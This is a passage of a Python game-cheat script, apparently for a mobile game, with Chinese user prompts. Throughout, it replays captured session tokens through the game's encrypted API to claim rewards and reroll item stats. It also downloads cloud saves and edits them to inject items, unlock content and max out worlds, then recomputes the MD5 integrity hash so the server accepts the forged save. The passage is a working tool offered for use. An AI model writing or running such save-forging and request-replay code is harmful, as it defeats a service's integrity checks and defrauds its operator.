            if str(item['fi']) == search_fi:
                result = item
                break
        if result:
            first_bt = result['c'][0].get('bt')
            first_bn = result['c'][0].get('bn')
            print(translation_dict.get(first_bt, first_bt))
            print(first_bn)
            if isinstance(first_values, tuple) and first_bt == first_value and first_min <= first_bn <= first_max:
                break
    data = {"req": "V327", "e": {"fi": search_fi, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("第一词条保存成功")
    else:
        print("第一词条保存失败")
    while True:
        data = {"req": "V326", "e": {"ad": 0, "f": 0, "fi": search_fi, "l": l2_value, "lv": level, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        result = None
        for item in decrypted_json['e']['d']['fl']:
            if str(item['fi']) == search_fi:
                result = item
                break
        if result:
            first_bt = result['c'][1].get('bt')
            first_bn = result['c'][1].get('bn')
            print(translation_dict.get(first_bt, first_bt))
            print(first_bn)
            if isinstance(second_values, tuple) and first_bt == second_value and second_min <= first_bn <= second_max:
                break
    data = {"req": "V327", "e": {"fi": search_fi, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("第二词条保存成功")
    else:
        print("第二词条保存失败")
def run_fiftieth_script():
    pi, ui, sk = get_pi_sk(加密)
    for i in range(12):
        data = {"req": "V976", "e": {"ctp": "1", "i": 1000+i+1, "pi": pi, "sk": sk, "tp": "10839", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("回忆成就领取成功")
        else:
            print("回忆成就领取失败")
    for i in range(6):
        data = {"req": "V976", "e": {"ctp": "0", "i": 0+i+1, "pi": pi, "sk": sk, "tp": "10839", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("奖励领取成功")
        else:
            print("奖励领取失败")
def run_fiftieth_one_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V203", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    try:
        inner_dict = decrypted_json["e"]["d"]["pr"]
        p_value = inner_dict["p"]
        s_value = inner_dict["s"]
        if pingtai == 'ios':
            p_value = p_value.replace('-', '+').replace('_', '/')
            p_value += '=' * (4 - (len(p_value) % 4))
            date = base64.b64decode(p_value)
            gzipp = gzip.decompress(date)
            try:
                first_de = gzip.decompress(base64.b64decode(p_value))
            except (base64.binascii.Error, gzip.BadGzipFile) as e:
                raise
            first_de = first_de.decode('utf-8')
            first_de = first_de.splitlines()
            result = ""
            for p_value_bytes in first_de:
                p_value_bytes = p_value_bytes.replace('-', '+').replace('_', '/').replace(',', '')
                p_value_bytes += '=' * (4 - (len(p_value_bytes) % 4))
        else:
            p_value_bytes = p_value.encode('utf-8')
            p_value_bytes = p_value_bytes.replace(b'-', b'+').replace(b'_', b'/').replace(b',', b'')
            p_value_bytes += b'=' * (4 - (len(p_value_bytes) % 4))
        try:
            decoded_p_value_dict = json.loads(base64.b64decode(p_value_bytes).decode('utf-8'))
            decoded_p_value_dict["sd"]["ppr"] = []
            ppr_values = []
            decoded_p_value_dict["sd"]["ppr"].extend(ppr_values)
            decoded_p_value_dict["sd"]["asp"] = []
            asp_values = []
            decoded_p_value_dict["sd"]["asp"].extend(asp_values)
            decoded_p_value_dict["sd"]["psla"] = []
            psla_values = []
            decoded_p_value_dict["sd"]["psla"].extend(psla_values)
            decoded_p_value_dict["sd"]["mtrl"] = []
            mtrl_values = []
            decoded_p_value_dict["sd"]["mtrl"].extend(mtrl_values)
            decoded_p_value_dict["sd"]["lpapi"] = []
            lpapi_values = []
            decoded_p_value_dict["sd"]["lpapi"].extend(lpapi_values)
            decoded_p_value_dict["sd"]["pasi"] = []
            pasi_lists = []
            decoded_p_value_dict["sd"]["pasi"].extend(pasi_lists)
            compact_json = json.dumps(decoded_p_value_dict, separators=(',', ':'))
            md5_hash = hashlib.md5(compact_json.encode('utf-8'))
            encrypted_result_md5 = md5_hash.hexdigest()
            compact_json2 = base64.b64encode(compact_json.encode('utf-8'))
            compact_json3 = b'"' + compact_json2 + b'"'
            compact_json4 = compact_json3.decode('utf-8').replace('=', ',')
            compressed = zlib.compress(compact_json4.encode('utf-8'), wbits=31)
            compressed_base64 = base64.b64encode(compressed).decode('utf-8')
            compressed_base = compressed_base64.replace('+', '-').replace('/', '_').replace('=', ',')
            data = {"req": "V206", "e": {"m": encrypted_result_md5, "pi": pi, "pr": compressed_base, "s": s_value, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                    print("消除成功，请选择云端登录")
            else:
                    print("消除失败")
        except json.JSONDecodeError as e:
            print(f"解析解码后的p字段为字典出现错误: {e}")
            raise
    except Exception:
        pass
def run_fiftieth_second_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V203", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    try:
        inner_dict = decrypted_json["e"]["d"]["pr"]
        p_value = inner_dict["p"]
        s_value = inner_dict["s"]
        if pingtai == 'ios':
            p_value = p_value.replace('-', '+').replace('_', '/')
            p_value += '=' * (4 - (len(p_value) % 4))
            date = base64.b64decode(p_value)
            gzipp = gzip.decompress(date)
            try:
                first_de = gzip.decompress(base64.b64decode(p_value))
            except (base64.binascii.Error, gzip.BadGzipFile) as e:
                raise
            first_de = first_de.decode('utf-8')
            first_de = first_de.splitlines()
            result = ""
            for p_value_bytes in first_de:
                p_value_bytes = p_value_bytes.replace('-', '+').replace('_', '/').replace(',', '')
                p_value_bytes += '=' * (4 - (len(p_value_bytes) % 4))
            decoded_p_value_dict = json.loads(base64.b64decode(p_value_bytes).decode('utf-8'))
            data = {"req": "V316", "e": {"b": "0", "n": "", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            pasi_list = decrypted_json['e']['d'].get('pel', [])
            gj_list = [21050, 21051, 21052, 21053, 21054, 21055, 21056, 21057, 21058, 21059, 21060, 21061, 21062, 21063, 21064, 21065, 21066, 21067, 21068, 21069, 21070, 21071, 21072, 21073, 21074, 21075, 21076, 21077, 21078, 21079]
            filtered = [d for d in pasi_list if int(d['pti']) in gj_list]
            if filtered:
                l_value = max(int(d['l']) for d in filtered)
                result = [d['pi1'] for d in filtered if int(d['l']) == l_value]
                pacid_value = random.choice(result)
            else:
                print("没有符合条件的挂件")
        else:
            p_value_bytes = p_value.encode('utf-8')
            p_value_bytes = p_value_bytes.replace(b'-', b'+').replace(b'_', b'/').replace(b',', b'')
            p_value_bytes += b'=' * (4 - (len(p_value_bytes) % 4))
            decoded_p_value_dict = json.loads(base64.b64decode(p_value_bytes).decode('utf-8'))
            data = {"req": "V316", "e": {"b": "0", "n": "", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            pasi_list = decrypted_json['e']['d'].get('pel', [])
            gj_list = [21050, 21051, 21052, 21053, 21054, 21055, 21056, 21057, 21058, 21059, 21060, 21061, 21062, 21063, 21064, 21065, 21066, 21067, 21068, 21069, 21070, 21071, 21072, 21073, 21074, 21075, 21076, 21077, 21078, 21079]
            filtered = [d for d in pasi_list if int(d['pti']) in gj_list]
            if filtered:
                l_value = max(int(d['l']) for d in filtered)
                result = [d['pi1'] for d in filtered if int(d['l']) == l_value]
                pacid_value = random.choice(result)
            else:
                print("没有符合条件的挂件")
        try:
            choice = input(f"\n请输入1注入挂件，输入2消除虚拟挂件，输入3注入预制数量挂件: \n")
            if choice == "1":
                item_menu = {'1':('紫手套','super_clock'),'2':('金属弹弓','slingshot_1'),'3':('聚能电池','super_clock_8'),'4':('警用电击棍','super_clock_16'),'5':('加速时钟','super_clock_15'),'6':('红蜡烛','super_clock_1'),'7':('大爆竹','super_clock_12'),'8':('强效杀虫剂','super_clock_10'),'9':('高阶魔法球','magic_book_1'),'10':('太阳锅盔','super_clock_3'),'11':('止疼剂','painkiller_1'),'12':('阳光齿轮','sun_gear_1'),'13':('时光胶囊','travel_together_1'),'14':('糖果篮子','candy_basket'),'15':('降魔披风','hero_cape_1'),'16':('幽浮飞碟','flying_saucer'),'17':('英雄王冠','hero_crown'),'18':('精致抑能链','mithril_shackles')}
                chinese_to_english = {name: pact for _, (name, pact) in item_menu.items()}
                number_to_chinese = {num: name for num, (name, _) in item_menu.items()}
                print("\n=== 挂件选择菜单 ===")
                print("输入数字 1~15 选择挂件，或输入中文名称，空回车结束选择")
                print("每选一个挂件后，会询问数量（空回车默认 数量0）\n")
                while True:
                    print("请选择挂件：")
                    for num, name in number_to_chinese.items():
                        print(f"{num}: {name}")
                    print("（直接回车结束选择）")
                    user_input = input("你要刷什么挂件？(输入数字1-15或中文名，直接回车结束): ").strip()
                    if not user_input:
                        break
                    pact_value = None
                    if user_input.isdigit():
                        num = user_input
                        if num in number_to_chinese:
                            chosen_name = number_to_chinese[num]
                            pact_value = chinese_to_english[chosen_name]
                            print(f"已选择: {chosen_name}")
                        else:
                            print("无效的数字，请输入 1~15")
                            continue
                    else:
                        pact_value = chinese_to_english.get(user_input)
                        if pact_value:
                            for num, (name, p) in item_menu.items():
                                if p == pact_value:
                                    chosen_name = name
                                    print(f"已选择: {chosen_name} [编号:{num}]")
                                    break
                        else:
                            print("未识别的挂件名称，请重新输入。可输入数字1-15或中文名。")
                            continue
                    count_input = input("要刷多少个？(直接回车默认 0): ").strip()
                    try:
                        count = int(count_input) if count_input else 0
                    except ValueError:
                        print("数量输入无效，默认为 0")
                        count = 0
                    for _ in range(count):
                        new_item = {
                            'paci': -1,
                            'pact': pact_value,
                            'pacid': pacid_value,
                            'l': l_value
                        }
                        pasi_list.append(new_item)
                        print("已添加")
                    print("\n=== 选择结束 ===")
                print(f"总共添加了 {len(pasi_list)} 个挂件配置。")
            elif choice == "2":
                pasi_list = []
            elif choice == "3":
                counts = [('super_clock', 30),('slingshot_1', 20),('super_clock_8', 15),('super_clock_16', 15),('super_clock_15', 15),('super_clock_1', 15),('super_clock_12', 10),('super_clock_3', 10),('super_clock_10', 10),('magic_book_1', 10),('painkiller_1', 10),('sun_gear_1', 10),('travel_together_1', 15),('candy_basket', 10),('hero_cape_1', 15),('flying_saucer', 15),('hero_crown', 15),('mithril_shackles', 15)]
                pa_list = []
                for pact, count in counts:
                    pa_list.extend([{'paci': -1, 'pact': pact, 'pacid': pacid_value, 'l': l_value}] * count)
                pasi_list = pasi_list + pa_list
            else:
                print("输入错误，请重新运行脚本并正确输入。")
                return
            decoded_p_value_dict["sd"]["pasi"] = pasi_list
            compact_json = json.dumps(decoded_p_value_dict, separators=(',', ':'))
            md5_hash = hashlib.md5(compact_json.encode('utf-8'))
            encrypted_result_md5 = md5_hash.hexdigest()
            compact_json2 = base64.b64encode(compact_json.encode('utf-8'))
            compact_json3 = b'"' + compact_json2 + b'"'
            compact_json4 = compact_json3.decode('utf-8').replace('=', ',')
            compressed = zlib.compress(compact_json4.encode('utf-8'), wbits=31)
            compressed_base64 = base64.b64encode(compressed).decode('utf-8')
            compressed_base = compressed_base64.replace('+', '-').replace('/', '_').replace('=', ',')
            data = {"req": "V206", "e": {"m": encrypted_result_md5, "pi": pi, "pr": compressed_base, "s": s_value, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("注入成功，请选择云端登录")
            else:
                print("失败")
        except json.JSONDecodeError as e:
            print(f"解析解码后的p字段为字典出现错误: {e}")
            raise
    except Exception:
        pass
def run_fiftieth_third_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V203", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if choice == "1":
        unlockhs_values = [25001,25002,25003,25004,25005,25006,25007,25008,25009,25010,25011,25012,25013,25014,25015,25016,25017,25018,25019,25020,25021,25022,25023,25024,25025,25026,25027,25028,25029,25030,25031,25032,25033,25034,25035,25036,25037,25038,25039,25040,25041,25042,25043,25044,25045,25046,25047,25048,25049,25050,25051,25052,25053,25054,25055,25056,25057,25058,25059,25060,25061,25062,25063,25064,25065,25066,25067,25068,25069,25070,25071,25072,25073,25074,25075,25076,25077,25078,25079,25080,25081,25082,25083,25084,25085,25086,25087,25088,25089,25090,25091,25092,25093,25094,25095,25096,25097,25098,25099,25100,25101,25102,25103,25104,25105,25106,25107,25108,25109,25110,25111,25112,25113,25114,25115,25116,25117,25118,25119,25120,25121,25122,25123,25124,25125,25126,25127,25128,25129,25130,25131,25132,25133,25134,25135,25136,25137,25138,25139,25140,25141,25142,25143,25144,25145,25146,25147,25148,25149,25150,25151,25152,25153,25154,25155,25156,25157,25158,25159,25160,25161,25162,25163,25164,25165,25166,25167,25168,25169,25170,25171,25172,25173,25174,25175,25176,25177,25178,25179,25180,25181,25182,25183,25184,25185,25186,25187,25188,25189,25190,25191,25192,25193,25194,25195,25196,25197,25198,25199,25200,25201,25202,25203,25204,25205,25206,25207,25208,25209,25210,25211,25212,25213,25214,25215,25216,25217,25218,25219,25220,25221,25222,25223,25224,25225,25226,25227,25228,25229,25230,25231,25232,25233,25234,25235,25236,25237,25238,25239,25240,25241,25242,25243,25244,25245,25246,25247,25248,25249,25250,25251,25252,25253,25254,25255,25256,25257,25258,25259,25260,25261,25262,25263,25264,25265,25266,25267,25268,25269,25270,25271,25272,25273,25274,25275,25276,25277,25278,25279,25280,25281,25282,25283,25284,25285,25286,25287,25288,25289,25290,25291,25292,25293,25294,25295,25296,25297,25298,25299,25300,25301,25302,25303,25304,25305,25306,25307,25308,25309,25310,25311,25312,25313,25314,25315,25316,25317,25318,25319,25320,25321,25322,25323,25324,25325,25326,25327,25328,25329,25330,25331,25332,25333,25334,25335,25336,25337,25338,25339,25340,25341,25342,25343,25344,25345,25346,25347,25348,25349,25350,25351,25352,25353,25354,25355,25356,25357,25358,25359,25360,25361,25362,25363,25364,25365,25366,25367,25368,25369,25370,25371,25372,25373,25374,25375,25376,25377,25378,25379,25380,25381,25382,25383,25384,25385,25386,25387,25388,25389,25390,25391,25392,25393,25394,25395,25396,25397,25398,25399,25400,25401,25402,25403,25404,25405,25406,25407,25408,25409,25410,25411,25412,25413,25414,25415,25416,25417,25418,25419,25420,25421,25422,25423,25424,25425,25426,25427,25428,25429,25430,25431,25432,25433,25434,25435,25436,25437,25438,25439,25440,25441,25442,25443,25444,25445,25446,25447,25448,25449,25450,25451,25452,25453,25454,25455,25456,25457,25458,25459,25460,25461,25462,25463,25464,25465,25466,25467,25468,25469,25470,25471,25472,25473,25474,25475,25476,25477,25478,25479,25480,25481,25482,25483,25484,25485,25486,25487,25488,25489,25490,25491,25492,25493,25494,25495,25496,25497,25498,25499,25500,25501,25502,25503,25504,25505,25506,25507,25508,25509,25510,25511,25512,25513,25514,25515,25516,25517,25518,25519,25520,25521,25522,25523,25524,25525,25526,25527,25528,25529,25530,25531,25532,25533,25534,25535,25536,25537,25538,25539,25540,25541,25542,25543,25544,25545,25546,25547,25548,25549,25550,25551,25552,25553,25554,25555,25556,25557,25558,25559,25560,25561,25562,25563,25564,25565,25566,25567,25568,25569,25570,25571,25572,25573,25574,25575,25576,25577,25578,25579,25580,25581,25582,25583,25584,25585,25586,25587,25588,25589,25590,25591,25592,25593,25594,25595,25596,25597,25598,25599,25600,25601,25602,25603,25604,25605,25606,25607,25608,25609,25610,25611,25612,25613,25614,25615,25616,25617,25618,25619,25620,25621,25622,25623,25624,25625,25626,25627,25628,25629,25630,25631,25632,25633,25634,25635,25636,25637,25638,25639,25640,25641,25642,25643,25644,25645,25646,25647,25648,25649,25650,25651,25652,25653,25654,25655,25656,25657,25658,25659,25660,25661,25662,25663,25664,25665,25666,25667,25668,25669,25670,25671,25672,25673,25674,25675,25676,25677,25678,25679,25680,25681,25682,25683,25684,25685,25686,25687,25688,25689,25690,25691,25692,25693,25694,25695,25696,25697,25698,25699,25700,25701,25702,25703,25704,25705,25706,25707,25708,25709,25710,25711,25712,25713,25714,25715,25716,25717,25718,25719,25720,25721,25722,25723,25724,25725,25726,25727,25728,25729,25730,25731,25732,25733,25734,25735,25736,25737,25738,25739,25740,25741,25742,25743,25744,25745,25746,25747,25748,25749,25750,25751,25752,25753,25754,25755,25756,25757,25758,25759,25760,25761,25762,25763,25764,25765,25766,25767,25768,25769,25770,25771,25772,25773,25774,25775,25776,25777,25778,25779,25780,25781,25782,25783,25784,25785,25786,25787,25788,25789,25790,25791,25792,25793,25794,25795,25796,25797,25798,25799,25800,25801,25802,25803,25804,25805,25806,25807,25808,25809,25810,25811,25812,25813,25814,25815,25816,25817,25818,25819,25820,25821,25822,25823,25824,25825,25826,25827,25828,25829,25830,25831,25832,25833,25834,25835,25836,25837,25838,25839,25840,25841,25842,25843,25844,25845,25846,25847,25848,25849,25850,25851,25852,25853,25854,25855,25856,25857,25858,25859,25860,25861,25862,25863,25864,25865,25866,25867,25868,25869,25870,25871,25872,25873,25874,25875,25876,25877,25878,25879,25880,25881,25882,25883,25884,25885,25886,25887,25888,25889,25890,25891,25892,25893,25894,25895,25896,25897,25898,25899,25900,25901,25902,25903,25904,25905,25906,25907,25908,25909,25910,25911,25912,25913,25914,25915,25916,25917,25918,25919,25920,25921,25922,25923,25924,25925,25926,25927,25928,25929,25930,25931,25932,25933,25934,25935,25936,25937,25938,25939,25940,25941,25942,25943,25944,25945,25946,25947,25948,25949,25950,25951,25952,25953,25954,25955,25956,25957,25958,25959,25960,25961,25962,25963,25964,25965,25966,25967,25968,25969,25970,25971,25972,25973,25974,25975,25976,25977,25978,25979,25980,25981,25982,25983,25984,25985,25986,25987,25988,25989,25990,25991,25992,25993,25994,25995,25996,25997,25998,25999]
    elif choice == "2":
        unlockhs_values = []
        while True:
            avatar = input()
            if not avatar:
                break
            if avatar.isdigit():
                unlockhs_values.append(int(avatar))
            else:
                print("请输入有效的数字")
    elif choice == "3":
        unlockhs_values = [25001,25002]
    elif not choice:
        print("已退出操作")
    else:
        print("无效输入，请重新运行脚本并选择1或2")
    try:
        inner_dict = decrypted_json["e"]["d"]["pr"]
        p_value = inner_dict["p"]
        s_value = inner_dict["s"]
        if pingtai == 'ios':
            p_value = p_value.replace('-', '+').replace('_', '/')
            p_value += '=' * (4 - (len(p_value) % 4))
            date = base64.b64decode(p_value)
            gzipp = gzip.decompress(date)
            try:
                first_de = gzip.decompress(base64.b64decode(p_value))
            except (base64.binascii.Error, gzip.BadGzipFile) as e:
                raise
            first_de = first_de.decode('utf-8')
            first_de = first_de.splitlines()
            result = ""
            for p_value_bytes in first_de:
                p_value_bytes = p_value_bytes.replace('-', '+').replace('_', '/').replace(',', '')
                p_value_bytes += '=' * (4 - (len(p_value_bytes) % 4))
        else:
            p_value_bytes = p_value.encode('utf-8')
            p_value_bytes = p_value_bytes.replace(b'-', b'+').replace(b'_', b'/').replace(b',', b'')
            p_value_bytes += b'=' * (4 - (len(p_value_bytes) % 4))
        try:
            decoded_p_value_dict = json.loads(base64.b64decode(p_value_bytes).decode('utf-8'))
            unlockhs_value = decoded_p_value_dict.get("sd", {}).get("unlockhs", [])
            unlockhs_value = unlockhs_values
            decoded_p_value_dict["sd"]["unlockhs"] = unlockhs_value
            compact_json = json.dumps(decoded_p_value_dict, separators=(',', ':'))
            md5_hash = hashlib.md5(compact_json.encode('utf-8'))
            encrypted_result_md5 = md5_hash.hexdigest()
            compact_json2 = base64.b64encode(compact_json.encode('utf-8'))
            compact_json3 = b'"' + compact_json2 + b'"'
            compact_json4 = compact_json3.decode('utf-8').replace('=', ',')
            compressed = zlib.compress(compact_json4.encode('utf-8'), wbits=31)
            compressed_base64 = base64.b64encode(compressed).decode('utf-8')
            compressed_base = compressed_base64.replace('+', '-').replace('/', '_').replace('=', ',')
            data = {"req": "V206", "e": {"m": encrypted_result_md5, "pi": pi, "pr": compressed_base, "s": s_value, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                    print("注入成功，请选择云端登录")
            else:
                    print("注入失败")
        except json.JSONDecodeError as e:
            print(f"解析解码后的p字段为字典出现错误: {e}")
            raise
    except Exception:
        pass
def run_fiftieth_fourth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V203", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    try:
        inner_dict = decrypted_json["e"]["d"]["pr"]
        p_value = inner_dict["p"]
        s_value = inner_dict["s"]
        if pingtai == 'ios':
            p_value = p_value.replace('-', '+').replace('_', '/')
            p_value += '=' * (4 - (len(p_value) % 4))
            date = base64.b64decode(p_value)
            gzipp = gzip.decompress(date)
            try:
                first_de = gzip.decompress(base64.b64decode(p_value))
            except (base64.binascii.Error, gzip.BadGzipFile) as e:
                raise
            first_de = first_de.decode('utf-8')
            first_de = first_de.splitlines()
            result = ""
            for p_value_bytes in first_de:
                p_value_bytes = p_value_bytes.replace('-', '+').replace('_', '/').replace(',', '')
                p_value_bytes += '=' * (4 - (len(p_value_bytes) % 4))
        else:
            p_value_bytes = p_value.encode('utf-8')
            p_value_bytes = p_value_bytes.replace(b'-', b'+').replace(b'_', b'/').replace(b',', b'')
            p_value_bytes += b'=' * (4 - (len(p_value_bytes) % 4))
        try:
            decoded_p_value_dict = json.loads(base64.b64decode(p_value_bytes).decode('utf-8'))
            wmed_value = decoded_p_value_dict.get("sd", {}).get("wmed", [])
            wcif_data = decoded_p_value_dict.get("sd", {}).get("wcif", [])
            choice = input("请输入1注入满星世界，输入2注入初始世界: ")
            if choice == "1":
                moon_level_ids = [11, 1, 12, 13, 17, 14, 16, 15, 18, 19, 22, 24, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65]
                for world_item in wmed_value:
                    for level_item in world_item.get("e", []):
                        level_item["h"] = 1
                    if world_item.get("w") == 16:
                        existing_ids = [lv.get("i") for lv in world_item.get("e", [])]
                        for lid in moon_level_ids:
                            if lid not in existing_ids:
                                world_item["e"].append({"i": lid, "h": 1})
                decoded_p_value_dict["sd"]["wks"] = -1
                moon_found = False
                for wcif_item in wcif_data:
                    if wcif_item.get("wcwn") == "moon":
                        wcif_item["wcscu"] = True
                        wcif_item["wcbcu"] = True
                        wcif_item["wcpcu"] = True
                        moon_found = True
                        break
                if not moon_found:
                    wcif_data.append({"wcwn": "moon", "wcscu": True, "wcbcu": True, "wcpcu": True})
                decoded_p_value_dict["sd"]["wcif"] = wcif_data
            elif choice == "2":
                for world_item in wmed_value:
                    for level_item in world_item.get("e", []):
                        level_item["h"] = 0
                decoded_p_value_dict["sd"]["wks"] = 0
            else:
                print("输入错误，请重新运行脚本并正确输入。")
            decoded_p_value_dict["sd"]["wmed"] = wmed_value
            compact_json = json.dumps(decoded_p_value_dict, separators=(',', ':'))
            md5_hash = hashlib.md5(compact_json.encode('utf-8'))
            encrypted_result_md5 = md5_hash.hexdigest()
            compact_json2 = base64.b64encode(compact_json.encode('utf-8'))
            compact_json3 = b'"' + compact_json2 + b'"'
            compact_json4 = compact_json3.decode('utf-8').replace('=', ',')
            compressed = zlib.compress(compact_json4.encode('utf-8'), wbits=31)
            compressed_base64 = base64.b64encode(compressed).decode('utf-8')
            compressed_base = compressed_base64.replace('+', '-').replace('/', '_').replace('=', ',')
            data = {"req": "V206", "e": {"m": encrypted_result_md5, "pi": pi, "pr": compressed_base, "s": s_value, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("注入成功，请选择云端登录")
            else:
                print("注入失败")
        except json.JSONDecodeError as e:
            print(f"解析解码后的p字段为字典出现错误: {e}")
            raise
    except Exception:
        pass
def run_fiftieth_fifth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V203", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    try:
        inner_dict = decrypted_json["e"]["d"]["pr"]
        p_value = inner_dict["p"]
        s_value = inner_dict["s"]
        if pingtai == 'ios':
            p_value = p_value.replace('-', '+').replace('_', '/')
            p_value += '=' * (4 - (len(p_value) % 4))
            date = base64.b64decode(p_value)
            gzipp = gzip.decompress(date)
            try:
                first_de = gzip.decompress(base64.b64decode(p_value))
            except (base64.binascii.Error, gzip.BadGzipFile) as e:
                raise
            first_de = first_de.decode('utf-8')
            first_de = first_de.splitlines()
            result = ""
            for p_value_bytes in first_de:
                p_value_bytes = p_value_bytes.replace('-', '+').replace('_', '/').replace(',', '')
                p_value_bytes += '=' * (4 - (len(p_value_bytes) % 4))
        else:
            p_value_bytes = p_value.encode('utf-8')
            p_value_bytes = p_value_bytes.replace(b'-', b'+').replace(b'_', b'/').replace(b',', b'')
            p_value_bytes += b'=' * (4 - (len(p_value_bytes) % 4))
        try:
            decoded_p_value_dict = json.loads(base64.b64decode(p_value_bytes).decode('utf-8'))
            psla_value = decoded_p_value_dict.get("sd", {}).get("psla", [])
            found = False
            for item in psla_value:
                if item["icpi"] == 428:
                    item["icl"] = 5
                    found = True
                    break
            if not found:
               psla_value.append({"icpi": 428, "icl": 5})
            new_psla_value = []
            count = 0
            for item in psla_value:
                if item["icpi"] == 428 and item["icl"] == 5:
                    if count == 0:
                        new_psla_value.append(item)
                        count += 1
                else:
                    new_psla_value.append(item)
            psla_value = new_psla_value
            decoded_p_value_dict["sd"]["psla"] = psla_value
            compact_json = json.dumps(decoded_p_value_dict, separators=(',', ':'))
            md5_hash = hashlib.md5(compact_json.encode('utf-8'))
            encrypted_result_md5 = md5_hash.hexdigest()
            compact_json2 = base64.b64encode(compact_json.encode('utf-8'))
            compact_json3 = b'"' + compact_json2 + b'"'
            compact_json4 = compact_json3.decode('utf-8').replace('=', ',')
            compressed = zlib.compress(compact_json4.encode('utf-8'), wbits=31)
            compressed_base64 = base64.b64encode(compressed).decode('utf-8')
            compressed_base = compressed_base64.replace('+', '-').replace('/', '_').replace('=', ',')
            data = {"req": "V206", "e": {"m": encrypted_result_md5, "pi": pi, "pr": compressed_base, "s": s_value, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                    print("注入成功，请选择云端登录")
            else:
                    print("注入失败")
        except json.JSONDecodeError as e:
            print(f"解析解码后的p字段为字典出现错误: {e}")
            raise
    except Exception:
        pass
def run_fiftieth_seventh_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V203", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    try:
        inner_dict = decrypted_json["e"]["d"]["pr"]
        p_value = inner_dict["p"]
        s_value = inner_dict["s"]
        if pingtai == 'ios':
            p_value = p_value.replace('-', '+').replace('_', '/')
            p_value += '=' * (4 - (len(p_value) % 4))
            date = base64.b64decode(p_value)
            gzipp = gzip.decompress(date)
            try:
